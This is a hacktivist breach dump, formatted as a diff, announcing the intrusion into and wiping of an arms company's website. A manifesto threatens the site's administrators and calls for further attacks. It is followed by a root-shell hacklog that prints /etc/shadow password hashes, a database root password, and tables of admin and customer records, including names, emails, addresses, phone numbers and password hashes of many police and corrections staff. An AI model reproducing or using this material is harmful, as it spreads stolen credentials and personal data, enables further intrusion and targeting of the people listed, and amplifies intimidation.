@@ -1,0 +1,1848 @@
+   __| || |__ _____    _____/  |_|__| ______ ____   ____        
+   \   __   / \__  \  /    \   __\  |/  ___// __ \_/ ___\       #anonymous  
+    |  ||  |   / __ \|   |  \  | |  |\___ \\  ___/\  \___       #antisec     
+   /_  ~~  _\ (____  /___|  /__| |__/____ \ \___ \ \___  |      #solidarity
+     |_||_|        \/     \/             \/     \/     \/       
+ 
+################################################################################
+
+COMBINEDSYSTEMS DEFACED AND RM'D BY ANONYMOUS ON ANNIVERSARY OF BAHRAIN UPRISING
+
+So you war profiteering all crazy, selling mad chemical weapons to militaries 
+and cop shops around the world, thinking you will get away unscathed by the 
+rising tides of insurrection? Think again, assholes. Combined Systems, lay down
+your arms: you just lost the game. In the past we have marched on your offices
+in Jamestown, Pennsylvania: now it is time to march on your websites. All your
+"less than lethal" arms were simply no match for our 9000 cocks and mad black
+hat technique. We came, we saw, we rooted and rm'd your website. Umad?
+
+From the streets of Oakland to Tahrir Square, to Palestine, Greece, Bahrain and
+Syria, your sinister instruments of torture and brutality have been used by the
+vile swine enforcers of the rich ruling classes to repress our revolutionary
+movements. You shot and gassed protesters, running them off public parks in the
+US. Several dozen died because of your tear gas used in Egypt. You wave the 
+Israeli flag outside of your offices, while just two months ago your tear gas 
+cannisters fired by the IDF killed a man in the West Bank. Did you think we
+forgot? Why did you not expect us?
+
+In addition to dumping name, address, phone and password information for dozens
+of CSI employees and clients, our tag team of mayhem went the extra mile by
+dumping email for some of the pigs ordering anti-protester gear off their shitty
+website. We also hit sur-tec.com, some shitty CCTV surveillance company owned by
+former FBI director Clarence M. Kelley (their password was 'government'). Do you
+think they will appreciate the irony of being owned due to buying "security"
+products from a compromised website? How long do you think we had your website
+backdoored, capturing all incoming customers registrations and orders? 42? If
+you ever get your website back up, do you think you will be anything more than a
+shadow of your former self? Will your clients ever trust you again?
+
+Unfortunately, some random paypal phisher also hacked and abused the server.
+This noob was reported to the sysadmins by google, forcing us to move forward
+with our plans ahead of schedule. To the system administrators and web
+developers who aided and abetted CombinedSystems.com, we got something for your
+asses too (and it's more than getting pounded with 9000 dildos at maximum
+vibration speed): if you so much as lift a finger to support CSI in rebuilding
+their websites, we will post all your mail on you and all your clients (aka The
+Lolcaust). Any other brave whitehats want to step up to CSI's defense?
+
+To our hacker allies, our fellow occupiers, our militant comrades all around the 
+world, the time for talk is over: it's time to hack and smash, beat and shag.
+Each and every #FuckFBIFriday we will make war on the infrastructure of the
+military prison industrial non-organic complex, targeting all war profiteers,
+corporate executives, white hats, snitches and pigs. We're coming to loot,
+plunder, and make all their base belong to us. 
+
+You really think you can crush the spirit of the Arab Spring, the Occupation 
+Movement, and Anonymous with tear gas and subpoenas?! Mothafucka, our mad skills
+iz bulletproof. Now let's bust out that hacklog! <3
+
+#Anonymous' Blackbook http://mir.cr/12XRSILE
+
+
+# id
+uid=0(root) gid=0(root) groups=81(apache),1001(admin)
+
+# cat /etc/shadow
+root:$6$XA3nEJ3u$jTdVUv6ASAzQHRoisvRFT0UC32OviCaYFN1ZnCqPbuK9FaSHrbVoJLxdO5e5maWi0OJyELTtVnRjfySD3VZI//:15323:0:::::
+halt:*:9797:0:::::
+operator:*:9797:0:::::
+shutdown:*:9797:0:::::
+sync:*:9797:0:::::
+bin:*:9797:0:::::
+daemon:*:9797:0:::::
+adm:*:9797:0:::::
+lp:*:9797:0:::::
+mail:*:9797:0:::::
+postmaster:*:9797:0:::::
+news:*:9797:0:::::
+uucp:*:9797:0:::::
+games:*:9797:0:::::
+guest:*:9797:0:::::
+nobody:*:9797:0:::::
+sshd:!:13623:0:99999:7:::
+mysql:!:13946:0:99999:7:::
+apache:!:13946:0:99999:7:::
+ftp:!:13946:0:99999:7:::
+proftpd:!:13946:0:99999:7:::
+ntp:!:13946:0:99999:7:::
+admin:$1$HgFsFVPN$aV1rEssvruvulGi0icuTZ/:13946:0:99999:7:::
+cmd5checkpw:!:13987:0:99999:7:::
+alias:!:13987:0:99999:7:::
+qmaild:!:13987:0:99999:7:::
+qmaill:!:13987:0:99999:7:::
+qmailp:!:13987:0:99999:7:::
+qmailq:!:13987:0:99999:7:::
+qmailr:!:13987:0:99999:7:::
+qmails:!:13987:0:99999:7:::
+yinrunning:!:13987:0:99999:7:::
+cron:!:13987:0:99999:7:::
+vpopmail:!:13987:0:99999:7:::
+geeojr:$1$otVB6tcm$CB9HAOBixkDMDMBJsDPSx0:14714:0:99999:7:::
+ventrilo:!:14866:0:99999:7:::
+dizzle:$6$Z1M6S/Dl$GJoNATO8G7iMDeiJ6v4V1t5cW1IreQg80aT9rAPBwCIgl2rF94fxuibIxOX6Eh6QJhHVWQU8IpOjhSo30NWzi.:15383:0:99999:7:::
+
+# mysql -uroot -pbigGoat -e 'show databases'
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| cambridge          |
+| cbts               |
+| cgsurvey           |
+| cragar             |
+| csi                |
+| dio_dealers        |
+| dirty_guild        |
+| dmikc              |
+| kwotez             |
+| lldog              |
+| mark               |
+| mysql              |
+| plusovella         |
+| ppbnb              |
+| roundcubemail      |
+| sls                |
+| tweld              |
+| voltage            |
+| vpopmail           |
+| widespread         |
+| yinrunning         |
+| zip_codes          |
++--------------------+
+ 
+# mysql -uroot -pbigGoat csi -e 'show tables'
++-------------------------+
+| Tables_in_csi           |
++-------------------------+
+| admin_auth              |
+| admin_auth_permissions  |
+| admin_group_permissions |
+| admin_groups            |
+| admin_permissions       |
+| customers               |
+| dealers                 |
+| events                  |
+| featured                |
+| galleries               |
+| order_details           |
+| orders                  |
+| pages                   |
+| product_categories      |
+| products                |
+| quote_details           |
+| quotes                  |
+| zipcodes                |
++-------------------------+
+
+# mysql -uroot -pbigGoat csi -e 'select * from admin_auth'
++--------+---------+-------------+------------------------------------+------------------+------------------------------+------------+
+| AuthID | GroupID | User        | Crypt                              | Name             | Email                        | SessionKey |
++--------+---------+-------------+------------------------------------+------------------+------------------------------+------------+
+|      1 |       0 | becky       | $1$gBKmP3yL$U6pnUUgiSKW2he5UBhVmA/ | Rebecca Adamson  | becca.adamson@gmail.com      |            |
+|     18 |       0 | aprilbriggs | $1$MFK5TwyA$kkK8/FG0Uz.17HZlxoPsB. | April            | aprilmaebriggs@gmail.com     |            |
+|     19 |       0 | paul        | $1$N/4o6/9c$qt1nj4zH6haBNA6nbr/Pz/ | Paul Ford        | paulford@combinedsystems.com |            |
+|     20 |       0 | kristal     | $1$gV2rX/IL$D14hGEolAcUkYBdkAzMyQ1 | Kristal Starcher | kristal@combinedsystems.com  |            |
+|     21 |       0 | Amber       | $1$9B.J0lLD$P79Vgx5JxzwazBH64PeMD. | Amber Jones      | ajones@combinedsystems.com   |            |
+|     22 |       0 | Robin       | $1$wjjvGLpf$RFW0iC/kgux/Bm9bezuw7/ | Robin Urbansky   | robin@combinedsystems.com    |            |
+|     23 |       1 | john        | $1$Ojz4FFzU$MOMSg8dxlF0mgIIClSKwS. | John Dapkins     | john@jerseytactical.com      |            |
++--------+---------+-------------+------------------------------------+------------------+------------------------------+------------+
+
+# mysql -uroot -pbigGoat csi -e 'select * from customers'
++------------+------------------+--------------------------------------+------------------------------------+-----------+--------------+----------------------------------------+----------------------------------------------------+----------+----------+-----------------+-------+---------------------------------------------------+---------+---------+-----------------+-------------+----------+
+| CustomerID | PaymentGatewayID | SessionKey                           | Password                           | FirstName | LastName     | Email                                  | Address                                            | Address2 | Address3 | City            | State | Company                                           | Zip     | Country | Phone           | AccountType | Approved |
++------------+------------------+--------------------------------------+------------------------------------+-----------+--------------+----------------------------------------+----------------------------------------------------+----------+----------+-----------------+-------+---------------------------------------------------+---------+---------+-----------------+-------------+----------+
+|        100 | NULL             | 57bb9154-3ed6-11e1-8560-00163e001107 | $1$Dsq2lGGU$XEcNv74KmQZyAprfKlWjj1 | Becky     | Adamson      | becca.adamson@gmail.com                | 104 E. 5th                                         | NULL     | NULL     | kansas City     | MO    | Paul Davies Design                                | 64106   | NULL    | 8168384617      | Distributor |        1 |
+|        102 | NULL             |                                      | $1$vD9GENEZ$ghd1OfDYCNA2MI2D/x6iU. | PR        | Ford         | prford12@gmail.com                     | 388 Kinsman Road                                   | NULL     | NULL     | Jamestown       | PA    | ABC Company                                       | 16134   | NULL    | 5122481117      | Distributor |        1 |
+|        105 | NULL             | 3fd1084c-4b85-11e1-8560-00163e001107 | $1$X3AJN.Ti$KlkRsDux9dBSRZeJ60rJF/ | Kristal   | Starcher     | kristal@combinedsystems.com            | 388 Kinsman Rd.                                    | NULL     | NULL     | Jamestown       | PA    | CSI                                               | 16134   | NULL    | 724-932-2177    | Agency      |        1 |
+|        104 | NULL             | a5be641e-3c8b-11e1-8560-00163e001107 | $1$.fTDRoLb$nBkAwydu.Mycw2XZswk2// | becky     | adamson      | becky@fireflymkt.com                   | 601 Walnut                                         | NULL     | NULL     | kansas city     | MO    | 123                                               | 64105   | NULL    | 8168384617      | Agency      |        1 |
+|        107 | NULL             | NULL                                 | $1$XwlU4Vw6$3lSjbd/YN8vIbm0y5pL3e1 | Paul      | Ford         | paulford@combinedsystems.com           | 16100 Braesgate Drive                              | NULL     | NULL     | Austin          | TX    | DIST ABC                                          | 78717   | NULL    | 512-244-5906    | Distributor |        1 |
+|        143 | NULL             | NULL                                 | $1$FaV6UwhY$YtqgVimvLYIPX1W5uSR4J/ | Jeff      | Frost        | JFrost@pcsonet.com                     | 14400 49th Street                                  | NULL     | NULL     | Clearwater      | FL    | Pinellas County Sheriff\\                         | 33762   | NULL    | 727-464-6415    | Agency      |        1 |
+|        121 | NULL             | NULL                                 | $1$Za4buTCY$k7SbPieSNmvsyuOf5LpMA. | Lauren    | Maddox       | lmaddox@jeffcitymo.org                 | 401 Monroe Street                                  | NULL     | NULL     | Jefferson City  | MO    | Jefferson City Police Department                  | 65101   | NULL    | 573-634-6348    | Agency      |        1 |
+|        109 | NULL             | NULL                                 | $1$Roh3RmaD$7WpU5zZQjSWgFytAoFIDi1 | Dennis    | Palmer       | dennispalmer@combinedsystems.com       | 26951 Cedar Mesa Rd.                               | NULL     | NULL     | Cedaredge       | CO    | Cedar Mesa PD                                     | 81413   | NULL    | 970 856-3972    | Agency      |        1 |
+|        110 | NULL             | NULL                                 | $1$Z3NeJ.hv$Joi85kbmqtZiko5463Gz9. | Dennis    | Palmer       | DennisPalmer@combinedsystems.com       | 26951 Cedar Mesa Rd.                               | NULL     | NULL     | Cedaredge       | CO    | Cedaredge PD                                      | 81413   | NULL    | 970 856-3972    | Agency      |        1 |
+|        112 | NULL             | NULL                                 | $1$TXQa.GeH$hgdm0ZGLIcN3Qf0OO21DE0 | Roberto   | Dominguez    | rdominguez@whiteplainsny.gov           | 77 S. Lexington Ave.                               | NULL     | NULL     | White Plains    | NY    | City of White Plains Police Department            | 10601   | NULL    | 914-422-6111    | Agency      |        1 |
+|        119 | NULL             | 9627865e-43af-11e1-8560-00163e001107 | $1$8TLNFpzJ$70ZiAdAZoHJc3LnLIVrB3. | Scott     | haymaker     | shaymaker@cojtwn.com                   | 401 Washington St                                  | NULL     | NULL     | Johnstown       | PA    | Johnstown Police Dept                             | 15901   | NULL    | 814-533-2080    | Agency      |        1 |
+|        120 | NULL             | 7ae19c86-42ce-11e1-8560-00163e001107 | $1$pG8bTL0k$W3f2jmm2aKcbpV5Jv1poO1 | David     | Martin       | dmartin@edennc.us                      | 308-B E. Stadium Dr                                | NULL     | NULL     | Eden            | NC    | Eden Police Department                            | 27288   | NULL    | (336) 623-9755  | Agency      |        1 |
+|        122 | NULL             | NULL                                 | $1$enIkEDU5$.Vf7npITBbj9Gpye/9OQz1 | Gene      | Petrino      | epetrino@psd.plantation.org            | 451 NW 70th Ter                                    | NULL     | NULL     | Plantation      | FL    | Plantation Police Department                      | 33317   | NULL    | 954-797-2100    | Agency      |        1 |
+|        116 | NULL             | 377e99d0-45d0-11e1-8560-00163e001107 | $1$tHJLMsFW$2e8aY//On9OrG0D8eKA4s. | Chris     | McDonald     | mcdonaldcr@state.gov                   | 4000 N Adrews Ave                                  | NULL     | NULL     | Ft. Lauderdale  | FL    | US Department of State                            | 33309   | NULL    | 954-630-1165    | Agency      |        1 |
+|        117 | NULL             |                                      | $1$Eqe5/tAJ$ABKUrVSSeLfEmZo8vBV.Y1 | Steve     | Hooper       | Steve.Hooper@odrc.state.oh.us          | 11781 State Rt 762                                 | NULL     | NULL     | Orient          | OH    | Ohio Dept. of Rehabilitation and Corrections      | 43146   | NULL    | 614-915-7910    | Agency      |        1 |
+|        126 | NULL             | NULL                                 | $1$8v1XmbP7$573TUTFpUcj1pvHBDwZx91 | Jody      | Wheet        | jrw@village.herkimer.ny.us             | 120 Green St                                       | NULL     | NULL     | Herkimer        | NY    | Herkimer Police Department                        | 13350   | NULL    | 315-866-4330    | Agency      |        1 |
+|        127 | NULL             | NULL                                 | $1$2ybsup7K$BAYhzdZt/u4IAh3ZC.ujw0 | ringgold  | delahoussaye | ringgold.delahoussaye@sheriff.hctx.net | 1200 Baker St.                                     | NULL     | NULL     | Houston         | TX    | Harris County Sheriffs Office                     | 77002   | NULL    | 713-755-8800    | Agency      |        1 |
+|        138 | NULL             | NULL                                 | $1$D265UKqE$mfubHye9NVrMXB1WUKJ7V0 | Keith     | Chesnut      | keith_chesnut@isp.state.il.us          | 4700 Rogers St                                     | NULL     | NULL     | Springfield     | IL    | Illinois State Police, SOCOM                      | 62703   | NULL    | 815-509-6875    | Agency      |        1 |
+|        124 | NULL             | NULL                                 | $1$Hn8QCiP8$Ks2iEKkSUUm1YF4Re5twg/ | Matthew   | Hood         | mlhood@cityofchesapeake.net            | 304 Albemarle Dr                                   | NULL     | NULL     | Chesapeake      | VA    | Chesapeake Police Dept SWAT                       | 23322   | NULL    | 757-560-3172    | Agency      |        1 |
+|        125 | NULL             | NULL                                 | $1$NzL7bndk$WHIPnvQZS8lEMJRzE3Kam1 | Angelo    | Vourakis     | angelo.vourakis@totaldefenseperu.com   | Calle Los Topacios 390 # 302 Urb. Cerros de Camach | NULL     | NULL     | Lima            | Other | Total Defense S.A.C                               | Lima18  | NULL    | 011511945957175 | Distributor |        0 |
+|        128 | NULL             | NULL                                 | $1$u15l6s4d$O/SeaO8wtPE19DeKqXT830 | Jeremy    | House        | jhouse@rogers.com                      | 474 Elgin St                                       | NULL     | NULL     | Ottawa          | Other | Ottawa Police Tactical Unit                       | K2S 2E2 | NULL    | 613-808-7459    | Agency      |        0 |
+|        129 | NULL             | 637efbf2-4840-11e1-8560-00163e001107 | $1$liO1rgwD$EcyFSeE174L.DV/aS1Owr1 | Brett     | Milo         | brettmilo@sbcglobal.net                | 4N468 School Rd                                    | NULL     | NULL     | St. Charles     | IL    | The Milo Group                                    | 60175   | NULL    | 6302157894      | Distributor |        1 |
+|        130 | NULL             | 7014564e-4856-11e1-8560-00163e001107 | $1$EvVqGVfP$K6MMi6xWCc390Ojxgcw5Z0 | Donald    | Tuuri        | tuurid@ci.kentwood.mi.us               | 4742 Walma AVE SE                                  | NULL     | NULL     | Kentwood        | MI    | Kentwood PD                                       | 49512   | NULL    | 61666986580     | Agency      |        1 |
+|        131 | NULL             | f0230972-4859-11e1-8560-00163e001107 | $1$.GqyG/5C$OzcJsAuQFDDScuedculk51 | John      | Castrodale   | pdchief.empiregov@skybeam.com          | 30 E. Park Ave                                     | NULL     | NULL     | Empire          | CO    | Empire Police Department                          | 80438   | NULL    | 303-569-2281    | Agency      |        1 |
+|        132 | NULL             | NULL                                 | $1$cnSlxefW$LXQtThuQ8sAubRArQUkXF1 | Johnnie   | Jones III    | jjones37@twu.edu                       | 301 Administration Drive                           | NULL     | NULL     | Denton          | TX    | Texas Woman\'s University                         | 76204   | NULL    | 8066264293      | Agency      |        0 |
+|        133 | NULL             | NULL                                 | $1$rwoNKWeO$QzhWqBeqshEl7FwwCY9xl. | Doug      | Vance        | dvance@vancesle.com                    | 3723 Cleveland Ave                                 | NULL     | NULL     | Columbus        | OH    | Vance Outdoors, Inc.                              | 43224   | NULL    | 614-471-7000 ex | Distributor |        1 |
+|        137 | NULL             | NULL                                 | $1$DIOQwVDQ$EJWok0Ex2R9rCa0Ij5UBI0 | Michael   | OHerron      | omichael22@aol.com                     | 3549 N. Vermilion St                               | NULL     | NULL     | Danville        | IL    | Ray OHerron Co, Inc                               | 61832   | NULL    | 800-223-2097    | Distributor |        1 |
+|        135 | NULL             | cee58b4e-4b6b-11e1-8560-00163e001107 | $1$95lnzKAJ$evjsaYq.05FbNWnGqon710 | robert    | salter       | rsalter@cityofnewport.com              | 120 broadway                                       | NULL     | NULL     | newport         | RI    | newport police department                         | 2840    | NULL    | 401-845-5865    | Agency      |        1 |
+|        136 | NULL             | 8df67c88-4940-11e1-8560-00163e001107 | $1$f/Ynr7/X$iFV2mTPtWL9yMgMDSkzAC. | Bob       | Rosipal      | brosipal@cascadecountymt.gov           | 3800 Ulm N. Frontage Road                          | NULL     | NULL     | Great Falls     | MT    | Cascade County Sheriff\\                          | 59404   | NULL    | (406)-454-6820  | Agency      |        1 |
+|        139 | NULL             | NULL                                 | $1$t1P8Pa5O$kKFZdpLX7xEwlUOaVdvnv/ | Kyle      | Montgomery   | kmontgomery@cityofmagnolia.com         | 18111 Buddy Riley                                  | NULL     | NULL     | Magnolia        | TX    | Magnolia Police Dept.                             | 77354   | NULL    | 281-356-2500    | Agency      |        1 |
+|        140 | NULL             | 7da039ba-4d04-11e1-acab-00163e001107 | $1$5ZvIxXne$SY7kS4vUFh8vgrNxzUB4b/ | Mark      | Silbernagel  | mmsilbernage@wisc.edu                  | 1429 Monroe Street                                 | NULL     | NULL     | Madison         | WI    | University of Wisconsin-Madison Police Department | 53711   | NULL    | 6085160563      | Agency      |        1 |
+|        141 | NULL             | NULL                                 | $1$/HyEDnY9$lEEkVO/CZl1F.uV0bt7jY. | Travis    | Norton       | tnorton@ci.oceanside.ca.us             | 3855 Mission Ave.                                  | NULL     | NULL     | Oceanside       | CA    | Oceanside Police Department                       | 92054   | NULL    | 760-435-4862    | Agency      |        1 |
+|        142 | NULL             | NULL                                 | $1$SWS6wYK6$z.VByyS4q3gtGIqZb.AcT. | Pete      | Fogarty      | pfogarty@kckpd                         | 7340 State                                         | NULL     | NULL     | Kansas City     | KS    | KCKPD                                             | 66104   | NULL    | 9135962056      | Agency      |        1 |
+|        145 | NULL             | NULL                                 | $1$g/TgUup0$K5qHjGpF9rqD4/eF1Zo7I0 | Todd      | Droll        | tad21@arl.psu.edu                      | PO Box 30                                          | NULL     | NULL     | State College   | PA    | Applied Research Laboratory                       | 16804   | NULL    | 814-865-3087    | Agency      |        1 |
+|        146 | NULL             | NULL                                 | $1$tMYUqKTs$mYy1.vUhvF.NrMbICQCKy. | Gary      | Bolen        | gbolen@columbusga.org                  | 510 Tenth Street                                   | NULL     | NULL     | Columbus        | GA    | Columbus Police De[artment                        | 31902   | NULL    | 706.225.4122    | Agency      |        1 |
+|        147 | NULL             | NULL                                 | $1$g/LE9k4L$sq926rPg8vQ9KvGg9tqW0. | Paul      | Poumaka      | ppoumaka@barrick.com                   | PO Box 484 Mt Hagen                                | NULL     | NULL     | Porgera         | Other | Porgera PNG                                       | 3456    | NULL    | +675 5443456    | Agency      |        0 |
+|        148 | NULL             | NULL                                 | $1$b7/jnDJg$U7IC/m5lMMuUBTtVsFKFG0 | Frank     | Moody        | fmoody@providenceri.com                | 325 Washington St                                  | NULL     | NULL     | Providence      | RI    | Providence Police                                 | 2903    | NULL    | 401-243-6134    | Agency      |        1 |
+|        149 | NULL             | 022ff858-4dc5-11e1-acab-00163e001107 | $1$Y0o4i828$vA5Y8z4sZSxNYBN0U3xSH/ | david     | kimak        | dkimak@livingstonnj.org                | 333 s livingston ave                               | NULL     | NULL     | livingston      | NJ    | livingston police dept                            | 7039    | NULL    | 973-992-3000x32 | Agency      |        1 |
+|        151 | NULL             | b109bde6-4d0c-11e1-acab-00163e001107 | $1$tpKbEJzx$4xy8qS.feoMokfAedkcGh0 | Charles   | Libby        | charlesl@portlandmaine.gov             | 109 Middle St                                      | NULL     | NULL     | Portland        | ME    | Portland PD                                       | 4101    | NULL    | 207 874 8530    | Agency      |        1 |
+|        163 | NULL             | NULL                                 | $1$7VHa6w4I$.e90VfNacxCxQ/P.hXKpb/ | Brian     | Roussell     | broussell@rochestermn.gov              | 101 4th St SE                                      | NULL     | NULL     | Rochester       | MN    | Rochester Police Department                       | 55901   | NULL    | 5072080093      | Agency      |        1 |
+|        162 | NULL             | d971e7d8-4cf6-11e1-acab-00163e001107 | $1$hNuOugwx$4MuJzqZVH1PIuZ97ZKjw/0 | Dan       | Sandberg     | sandberg_do@co.brown.wi.us             | 2684 Development Drive                             | NULL     | NULL     | Green Bay       | WI    | Brown County Sheriff\\                            | 54311   | NULL    | 920-448-4271    | Agency      |        1 |
+|        155 | NULL             | NULL                                 | $1$pHVhobO5$ZBOFy69KUmGVJnl1riyDu. | Sedrick   | Aiken        | aikens@bbfl.us                         | 100 East Boynton Beach Blvd.                       | NULL     | NULL     | Boynton Beach   | FL    | Boynton Beach Police Department                   | 33435   | NULL    | 561-742-6181    | Agency      |        1 |
+|        156 | NULL             | NULL                                 | $1$oDHSK.HU$zx0JvkSXwvFZcaGmsFfq// | Noel      | Thorburn     | akar@paradise.net.nz                   | 299b Clarks Beach Rd RD4 Pukekohe                  | NULL     | NULL     | Auckland        | Other | Akar (NZ) Law Enforcement & Tactical Supplies Ltd | 2679    | NULL    | 0064 9 2321489  | Distributor |        0 |
+|        184 | NULL             | NULL                                 | $1$7FsLOYYa$XPsxu768/dPrrDsU.ryNI0 | Gary      | Seymour      | gseymour@eriecountygov.org             | 1618 Ash Street                                    | NULL     | NULL     | Erie            | PA    | Erie County Prison                                | 16503   | NULL    | 814-451-7572    | Agency      |        0 |
+|        165 | NULL             | NULL                                 | $1$n2AVDZVo$Iv0L/XOQPTDi5O/utZzIF0 | Angelo    | Gabriele     | agabriele@jibc.ca                      | 715 McBride Blvd.                                  | NULL     | NULL     | New Westminster | Other | BC Corrections                                    | V3L 5T4 | NULL    | 604-528-5840    | Agency      |        0 |
+|        166 | NULL             |                                      | $1$cjug.1iq$nDgiMkcOABTEw..GuIO9Q. | Randal    | Hodges       | rhodges@bakerso.com                    | 1 Sheriffs office drive                            | NULL     | NULL     | Macclenny       | FL    | Baker County Sheriffs Office                      | 32063   | NULL    | 904-562-9087    | Agency      |        1 |
+|        167 | NULL             | NULL                                 | $1$aJ5Awv1q$Q.5LnL6tfL1.zmgvEUtBM/ | Greg      | McComb       | sales@maximumammunition.com            | 803 North Gordon Street                            | NULL     | NULL     | Marshall        | MI    | Maximum Ammunition LLC                            | 49068   | NULL    | 269-719-0643    | Agency      |        0 |
+|        168 | NULL             | NULL                                 | $1$UjaqrttV$Lo3lSZBo0BUkE1lGMsNsm1 | Stanley   | Schaeffer    | stanley.schaeffer@manateesheriff.com   | 600 US HWY 301 Blvd West Suite 202                 | NULL     | NULL     | Bradenton       | FL    | manatee county sheriff\\                          | 34205   | NULL    | 941-747-3011 ex | Agency      |        1 |
+|        169 | NULL             | NULL                                 | $1$h1OoHGck$98ZQgaTX9Ig3Avz9bSzrr1 | john      | kuhlen       | johnnykuhlen@yahoo.com                 | 1233 west main street                              | NULL     | NULL     | millville       | NJ    | NJ DOC                                            | 08332   | NULL    | 8567651125      | Agency      |        0 |
+|        170 | NULL             | 9816e5de-533d-11e1-a19d-00163e001107 | $1$4qlfclxA$9pHN5O/ylu7NlSK.6uSv/. | Jason     | McAmbley     | jason.mcambley@bangormaine.gov         | 240 Main Street                                    | NULL     | NULL     | Bangor          | ME    | Bangor Police Department                          | 4401    | NULL    | 207-947-7384    | Agency      |        1 |
+|        171 | NULL             | NULL                                 | $1$.E7Ejjdm$ZxVNIRBrOGWpK6C.8OBo31 | Charles   | Poole        | fourpooles@gmail.com                   | 155 E. Main St.                                    | NULL     | NULL     | Newark          | OH    | Licking County Sheriffs Office                    | 43055   | NULL    | 740-281-6006    | Agency      |        0 |
+|        172 | NULL             | 582f46fc-5462-11e1-a19d-00163e001107 | $1$CNrF1iuW$QwtMvxt5P.UnP3AR8mjyV1 | Richard   | Horrell      | rshorrel@gocolumbiamo.com              | 600 E Walnut                                       | NULL     | NULL     | Columbia        | MO    | Columbia Police Department                        | 65201   | NULL    | 5738747652      | Agency      |        1 |
+|        173 | NULL             | 5a952064-5350-11e1-a19d-00163e001107 | $1$gPcOkXzg$AEzCuaqMW6z2D1JfxkOjK0 | Sgt. Dawn | Shafer-D\\   | dshafer@co.broome.ny.us                | 155 Lt Vanwinkle Dr                                | NULL     | NULL     | Binghamton      | NY    | Broome County Sheriff\\                           | 13905   | NULL    | 607.778.6006    | Agency      |        1 |
+|        174 | NULL             | NULL                                 | $1$pyL3hGz/$60KA.3ButfCpk475ra8ke/ | Chuck     | DeGroff      | cdegroff@jacksongov.org                | 28900 E. Argo Road                                 | NULL     | NULL     | Grain Valley    | MO    | Jackson County Sheriff\\                          | 64029   | NULL    | 816-220-3274    | Agency      |        1 |
+|        175 | NULL             | NULL                                 | $1$2MU6O/3M$HYIkmQNrwDBxIMxjpFnbT/ | wade      | humphries    | wwadeh@hotmail.com                     | 1701 indigo island dr                              | NULL     | NULL     | hanahan         | SC    | north charleston police                           | 29410   | NULL    | 843 224 7922    | Agency      |        0 |
+|        176 | NULL             |                                      | $1$wrPXyqm6$SFA8ETEuygQG86i124ZCn. | Artie     | Roper        | aroper@doc.nv.gov                      | 5312 Coral Hills Street                            | NULL     | NULL     | North Las Vegas | NV    | Nevada Department of Corrections                  | 89081   | NULL    | 702-562-5003    | Agency      |        1 |
+|        177 | NULL             |                                      | $1$XwNsxlLN$obUV1lu2PCN0x50clhO5w/ | Charlie   | Beswick      | cbeswick@nbpd.org                      | 870 Santa Barbara Dr.                              | NULL     | NULL     | Newport Beach   | CA    | Newport Beach Police Dept.                        | 92660   | NULL    | 949-644-3678    | Agency      |        1 |
+|        178 | NULL             | 3261c480-53cd-11e1-a19d-00163e001107 | $1$og.rY6ny$CvwZ2umCv74/BXwdn8euE/ | Jim       | Harrell      | jim.harrell@mansfield-tx.gov           | 1601 Heritage Pkwy.                                | NULL     | NULL     | Mansfield       | TX    | Mansfield Police Department                       | 76063   | NULL    | 8178045709      | Agency      |        1 |
+|        183 | NULL             | 2c0521e4-56c1-11e1-a19d-00163e001107 | $1$IWmQgR9N$ZYhKre0WpWr12.aZmuFP61 | Charles   | Bogle        | chuck.bogle@rcstn.net                  | 802 Willow street                                  | NULL     | NULL     | Springfield     | TN    | Springfield                                       | 37172   | NULL    | 615-767-0270    | Agency      |        1 |
+|        180 | NULL             | NULL                                 | $1$67sKmjxo$n.mMglnuFjqPK/DPQ7QJr1 | Dale      | Dear         | dale.dear@colliersheriff.com           | 3319 Tamiami Trl E                                 | NULL     | NULL     | Naples          | FL    | Collier County Sheriff\\                          | 34112   | NULL    | 239-285-8299    | Agency      |        1 |
+|        181 | NULL             | NULL                                 | $1$QJ/LpGX8$IqiVeoChJyp2BqGz9pYbc/ | Scott     | Hagemeister  | shagemeister@rileycountypolice.org     | 1001 S. Seth Child Rd.                             | NULL     | NULL     | Manhattan       | KS    | Riley County Police Dept.                         | 66502   | NULL    | 785-537-2112 ex | Agency      |        1 |
+|        182 | NULL             | 1140271c-533f-11e1-a19d-00163e001107 | $1$f3ngPYKz$NOX6lAcoxx4Oh0Tya1Uc8/ | Robert    | McElroy      | rmcelroy@acgov.org                     | 6289 Madigan Road                                  | NULL     | NULL     | Dublin          | CA    | Alameda County Sheriff\\                          | 94568   | NULL    | 925-803-7133    | Agency      |        1 |
+|        191 | NULL             | NULL                                 | $1$aWwRzfii$LhDQ7zotCbif7iRt0gNdh0 | hassio    | mat          | aloo2200@hotmail.com                   | 366                                                | NULL     | NULL     | mam             | Other | ara                                               | 973     | NULL    | 39430542        | Agency      |        0 |
+|        185 | NULL             | 73234c0c-5650-11e1-a19d-00163e001107 | $1$WiGrW5.U$B.eI2RY1TjOqMghum2BQB0 | Wesley    | Green        | wgreen@ci.collierville.tn.us           | 156 N. Rowlett St.                                 | NULL     | NULL     | Collierville    | TN    | Collierville Police Dept                          | 38017   | NULL    | (901) 457-2500  | Agency      |        1 |
+|        186 | NULL             | NULL                                 | $1$cMMpUxdk$xgM7zDPGB8hFN6nd.fs/b0 | Steve     | Morrisey     | pd149@pottstown.org                    | 100 E. High St.                                    | NULL     | NULL     | Pottstown       | PA    | Pottstown PD                                      | 19464   | NULL    | 484-942-3801    | Agency      |        0 |
+|        187 | NULL             | NULL                                 | $1$QX/b7QpH$RTgw781brGd8bUTPqZNAI. | Rick      | Washburn     | richard.washburn@co.benton.wa.us       | 7122 W Okanogan Pl                                 | NULL     | NULL     | Kennewick       | WA    | Benton County Sheriffs Office                     | 99337   | NULL    | 509-735-6555x38 | Agency      |        0 |
+|        188 | NULL             | 61a62134-5420-11e1-a19d-00163e001107 | $1$FqM7vaTy$ix8pf/JJXU7tUgWa6cXKU0 | Cory      | Hunt         | chunt@allegancounty.org                | 112 Walnut Street                                  | NULL     | NULL     | Allegan         | MI    | Allegan County Sheriff\\                          | 49010   | NULL    | 269-673-0500 x4 | Agency      |        1 |
+|        189 | NULL             | NULL                                 | $1$sjozgMAc$R1qY9YXtCvaT3BfJDwsOu0 | John      | Feith        | jfeith@police.warracres-ok.gov         | 4801 North Reeves                                  | NULL     | NULL     | Warr Acres      | OK    | Warr Acres Police Department                      | 73122   | NULL    | 405-789-3329    | Agency      |        0 |
